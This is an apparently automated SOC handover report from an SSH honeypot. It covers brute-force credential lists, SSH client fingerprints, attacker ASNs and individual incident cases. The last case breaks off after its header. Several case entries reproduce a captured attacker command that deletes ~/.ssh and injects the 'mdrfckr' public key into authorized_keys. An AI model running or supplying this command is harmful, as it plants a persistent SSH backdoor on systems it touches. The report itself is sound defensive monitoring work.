# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-30 |
| **Generated At** | 2026-04-30T14:06:15Z |
| **Shift Time** | 14:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1071** |
| Confirmed Threats | **206** |
| False Positives Filtered | **865** (80.8%) |
| Unique Attacker IPs | **118** |
| Countries of Origin | **30** |
| High Severity Cases | **75** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **996** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **192** |
| Unique Credential Pairs | **117** |
| Unique Usernames | **52** |
| Unique Passwords | **113** |
| Successful Auth Pairs | **43** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 76 |
| `345gs5662d34` | 37 |
| `ubuntu` | 10 |
| `admin` | 10 |
| `deployer` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 37 |
| `3245gs5662d34` | 37 |
| `123456` | 3 |
| `1234` | 2 |
| `123456789` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 37 |
| `root` | `3245gs5662d34` | 37 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `root` | `qwertyuiop1` | 2 |
| `ftpuser` | `ftpuser@1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `toor` | `85.11.167.220` | 2026-04-30T10:18:01 |
| `root` | `user` | `41.216.177.55` | 2026-04-30T10:50:19 |
| `root` | `3245gs5662d34` | `41.216.177.55` | 2026-04-30T10:50:24 |
| `root` | `root@@` | `103.67.78.49` | 2026-04-30T11:07:48 |
| `root` | `3245gs5662d34` | `103.67.78.49` | 2026-04-30T11:07:53 |
| `root` | `123abc!` | `103.67.78.49` | 2026-04-30T11:11:12 |
| `root` | `Qq.123456` | `103.67.78.49` | 2026-04-30T11:12:21 |
| `root` | `12345678910` | `103.67.78.49` | 2026-04-30T11:14:36 |
| `root` | `Qwe!Asd!` | `103.67.78.49` | 2026-04-30T11:19:02 |
| `root` | `Abcd123456!@#$%^` | `103.67.78.49` | 2026-04-30T11:21:12 |
| `root` | `p0o9i8u7` | `103.67.78.49` | 2026-04-30T11:23:23 |
| `root` | `2wsx#EDC4rfv` | `103.67.78.49` | 2026-04-30T11:26:41 |
| `root` | `414414` | `103.67.78.49` | 2026-04-30T11:28:53 |
| `root` | `12345678?` | `103.67.78.49` | 2026-04-30T11:30:00 |
| `root` | `qwerty321` | `103.67.78.49` | 2026-04-30T11:32:15 |
| `root` | `google2024` | `103.67.78.49` | 2026-04-30T11:33:23 |
| `root` | `Aa123654789` | `103.67.78.49` | 2026-04-30T11:34:30 |
| `root` | `Abc` | `103.67.78.49` | 2026-04-30T11:36:45 |
| `root` | `!23456` | `103.67.78.49` | 2026-04-30T11:37:52 |
| `root` | `qaz123wsx!@#` | `103.67.78.49` | 2026-04-30T11:38:59 |
| `root` | `qwertyuiop1` | `102.88.137.213` | 2026-04-30T11:55:38 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-04-30T11:55:45 |
| `root` | `admin321321` | `138.124.20.112` | 2026-04-30T12:53:34 |
| `root` | `3245gs5662d34` | `138.124.20.112` | 2026-04-30T12:53:39 |
| `root` | `Asdf123.` | `138.124.20.112` | 2026-04-30T12:55:19 |
| `root` | `q1w2e3r4t5y6u7` | `138.124.20.112` | 2026-04-30T12:56:10 |
| `root` | `123456a` | `138.124.20.112` | 2026-04-30T12:57:54 |
| `root` | `qwertyuiop1` | `138.124.20.112` | 2026-04-30T12:58:44 |
| `root` | `Kd@123456` | `138.124.20.112` | 2026-04-30T12:59:32 |
| `root` | `rootme` | `138.124.20.112` | 2026-04-30T13:00:23 |
| `root` | `Wc123456789` | `138.124.20.112` | 2026-04-30T13:01:15 |
| `root` | `Pass@2026` | `138.124.20.112` | 2026-04-30T13:03:00 |
| `root` | `hardcore` | `138.124.20.112` | 2026-04-30T13:03:52 |
| `root` | `1q2w3e4r5t!Q@W#E$R%T` | `138.124.20.112` | 2026-04-30T13:04:47 |
| `root` | `tttttt` | `138.124.20.112` | 2026-04-30T13:05:41 |
| `root` | `qpwoeiruty` | `138.124.20.112` | 2026-04-30T13:08:21 |
| `root` | `ulises` | `138.124.20.112` | 2026-04-30T13:11:44 |
| `root` | `wangjing123` | `138.124.20.112` | 2026-04-30T13:15:03 |
| `root` | `Abc258369` | `138.124.20.112` | 2026-04-30T13:15:57 |
| `root` | `hik12345+` | `138.124.20.112` | 2026-04-30T13:16:50 |
| `root` | `admin!QAZ` | `31.59.89.180` | 2026-04-30T13:17:12 |
| `root` | `3245gs5662d34` | `31.59.89.180` | 2026-04-30T13:17:15 |
| `root` | `helloadmin` | `31.59.89.180` | 2026-04-30T13:28:05 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1071** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 195 |
| Go SSH scanner | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 186 | 9 |
| `16443846184e...` | Generic scanner | 2 | 1 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 186 | 9 | libssh-based |
| `95420f9d932d...` | libssh | 6 | 3 | — |
| `16443846184e...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 37 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `138.124.20.112`, `41.216.177.55`, `31.59.89.180`, `103.67.78.49`, `102.88.137.213`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **118** |
| Unique ASNs | **85** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 9 | HIGH |
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS16276` | OVH SAS | 6 | LOW |
| `AS24940` | Hetzner Online GmbH | 4 | LOW |
| `AS63949` | Akamai Connected Cloud | 3 | LOW |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS51167` | Contabo GmbH | 3 | LOW |
| `AS48635` | Your Hosting B.V. | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (75)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e9665e21fd07

| Field | Detail |
|---|---|
| **Source IP** | `85.11.167[.]220` |
| **First Seen** | 2026-04-30 10:17 |
| **Last Seen** | 2026-04-30 10:18 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 10:17:25` | `cowrie.session.connect` |
| `2026-04-30 10:17:27` | `cowrie.client.version` |
| `2026-04-30 10:17:27` | `cowrie.client.kex` |
| `2026-04-30 10:18:01` | `cowrie.login.success` |
| `2026-04-30 10:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.11.167[.]220` to AbuseIPDB if not already reported
- [ ] Block `85.11.167[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c10b814b67ac

| Field | Detail |
|---|---|
| **Source IP** | `41.216.177[.]55` |
| **First Seen** | 2026-04-30 10:50 |
| **Last Seen** | 2026-04-30 10:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 10:50:18` | `cowrie.session.connect` |
| `2026-04-30 10:50:18` | `cowrie.client.version` |
| `2026-04-30 10:50:18` | `cowrie.client.kex` |
| `2026-04-30 10:50:19` | `cowrie.login.success` |
| `2026-04-30 10:50:19` | `cowrie.session.params` |
| `2026-04-30 10:50:19` | `cowrie.command.input` |
| `2026-04-30 10:50:19` | `cowrie.command.failed` |
| `2026-04-30 10:50:20` | `cowrie.log.closed` |
| `2026-04-30 10:50:20` | `cowrie.session.params` |
| `2026-04-30 10:50:20` | `cowrie.command.input` |
| `2026-04-30 10:50:20` | `cowrie.session.file_download` |
| `2026-04-30 10:50:20` | `cowrie.log.closed` |
| `2026-04-30 10:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.177[.]55` to AbuseIPDB if not already reported
- [ ] Block `41.216.177[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-228f868c05de

| Field | Detail |
|---|---|
| **Source IP** | `41.216.177[.]55` |
| **First Seen** | 2026-04-30 10:50 |
| **Last Seen** | 2026-04-30 10:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 10:50:23` | `cowrie.session.connect` |
| `2026-04-30 10:50:23` | `cowrie.client.version` |
| `2026-04-30 10:50:23` | `cowrie.client.kex` |
| `2026-04-30 10:50:24` | `cowrie.login.success` |
| `2026-04-30 10:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.177[.]55` to AbuseIPDB if not already reported
- [ ] Block `41.216.177[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6723bf4939d6

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:07 |
| **Last Seen** | 2026-04-30 11:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:07:46` | `cowrie.session.connect` |
| `2026-04-30 11:07:47` | `cowrie.client.version` |
| `2026-04-30 11:07:47` | `cowrie.client.kex` |
| `2026-04-30 11:07:48` | `cowrie.login.success` |
| `2026-04-30 11:07:48` | `cowrie.session.params` |
| `2026-04-30 11:07:48` | `cowrie.command.input` |
| `2026-04-30 11:07:48` | `cowrie.command.failed` |
| `2026-04-30 11:07:48` | `cowrie.log.closed` |
| `2026-04-30 11:07:49` | `cowrie.session.params` |
| `2026-04-30 11:07:49` | `cowrie.command.input` |
| `2026-04-30 11:07:49` | `cowrie.session.file_download` |
| `2026-04-30 11:07:49` | `cowrie.log.closed` |
| `2026-04-30 11:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0a2433f8e3

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:07 |
| **Last Seen** | 2026-04-30 11:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:07:52` | `cowrie.session.connect` |
| `2026-04-30 11:07:52` | `cowrie.client.version` |
| `2026-04-30 11:07:52` | `cowrie.client.kex` |
| `2026-04-30 11:07:53` | `cowrie.login.success` |
| `2026-04-30 11:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5575fca40c5

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:11 |
| **Last Seen** | 2026-04-30 11:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:11:11` | `cowrie.session.connect` |
| `2026-04-30 11:11:11` | `cowrie.client.version` |
| `2026-04-30 11:11:11` | `cowrie.client.kex` |
| `2026-04-30 11:11:12` | `cowrie.login.success` |
| `2026-04-30 11:11:12` | `cowrie.session.params` |
| `2026-04-30 11:11:12` | `cowrie.command.input` |
| `2026-04-30 11:11:12` | `cowrie.command.failed` |
| `2026-04-30 11:11:12` | `cowrie.log.closed` |
| `2026-04-30 11:11:13` | `cowrie.session.params` |
| `2026-04-30 11:11:13` | `cowrie.command.input` |
| `2026-04-30 11:11:13` | `cowrie.session.file_download` |
| `2026-04-30 11:11:13` | `cowrie.log.closed` |
| `2026-04-30 11:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95bcaf3ef418

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:11 |
| **Last Seen** | 2026-04-30 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:11:16` | `cowrie.session.connect` |
| `2026-04-30 11:11:16` | `cowrie.client.version` |
| `2026-04-30 11:11:16` | `cowrie.client.kex` |
| `2026-04-30 11:11:17` | `cowrie.login.success` |
| `2026-04-30 11:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-653abc04652c

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:12 |
| **Last Seen** | 2026-04-30 11:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:12:19` | `cowrie.session.connect` |
| `2026-04-30 11:12:19` | `cowrie.client.version` |
| `2026-04-30 11:12:20` | `cowrie.client.kex` |
| `2026-04-30 11:12:21` | `cowrie.login.success` |
| `2026-04-30 11:12:21` | `cowrie.session.params` |
| `2026-04-30 11:12:21` | `cowrie.command.input` |
| `2026-04-30 11:12:21` | `cowrie.command.failed` |
| `2026-04-30 11:12:21` | `cowrie.log.closed` |
| `2026-04-30 11:12:22` | `cowrie.session.params` |
| `2026-04-30 11:12:22` | `cowrie.command.input` |
| `2026-04-30 11:12:22` | `cowrie.session.file_download` |
| `2026-04-30 11:12:22` | `cowrie.log.closed` |
| `2026-04-30 11:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ce5fcf0466c

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:12 |
| **Last Seen** | 2026-04-30 11:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:12:25` | `cowrie.session.connect` |
| `2026-04-30 11:12:25` | `cowrie.client.version` |
| `2026-04-30 11:12:25` | `cowrie.client.kex` |
| `2026-04-30 11:12:26` | `cowrie.login.success` |
| `2026-04-30 11:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02eef50900d6

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:14 |
| **Last Seen** | 2026-04-30 11:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:14:35` | `cowrie.session.connect` |
| `2026-04-30 11:14:35` | `cowrie.client.version` |
| `2026-04-30 11:14:35` | `cowrie.client.kex` |
| `2026-04-30 11:14:36` | `cowrie.login.success` |
| `2026-04-30 11:14:37` | `cowrie.session.params` |
| `2026-04-30 11:14:37` | `cowrie.command.input` |
| `2026-04-30 11:14:37` | `cowrie.command.failed` |
| `2026-04-30 11:14:37` | `cowrie.log.closed` |
| `2026-04-30 11:14:39` | `cowrie.session.params` |
| `2026-04-30 11:14:39` | `cowrie.command.input` |
| `2026-04-30 11:14:39` | `cowrie.session.file_download` |
| `2026-04-30 11:14:39` | `cowrie.log.closed` |
| `2026-04-30 11:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94fa9dc7824e

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:14 |
| **Last Seen** | 2026-04-30 11:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:14:42` | `cowrie.session.connect` |
| `2026-04-30 11:14:42` | `cowrie.client.version` |
| `2026-04-30 11:14:43` | `cowrie.client.kex` |
| `2026-04-30 11:14:43` | `cowrie.login.success` |
| `2026-04-30 11:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-540c937855b8

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:19 |
| **Last Seen** | 2026-04-30 11:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:19:01` | `cowrie.session.connect` |
| `2026-04-30 11:19:01` | `cowrie.client.version` |
| `2026-04-30 11:19:01` | `cowrie.client.kex` |
| `2026-04-30 11:19:02` | `cowrie.login.success` |
| `2026-04-30 11:19:03` | `cowrie.session.params` |
| `2026-04-30 11:19:03` | `cowrie.command.input` |
| `2026-04-30 11:19:03` | `cowrie.command.failed` |
| `2026-04-30 11:19:03` | `cowrie.log.closed` |
| `2026-04-30 11:19:04` | `cowrie.session.params` |
| `2026-04-30 11:19:04` | `cowrie.command.input` |
| `2026-04-30 11:19:04` | `cowrie.session.file_download` |
| `2026-04-30 11:19:04` | `cowrie.log.closed` |
| `2026-04-30 11:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
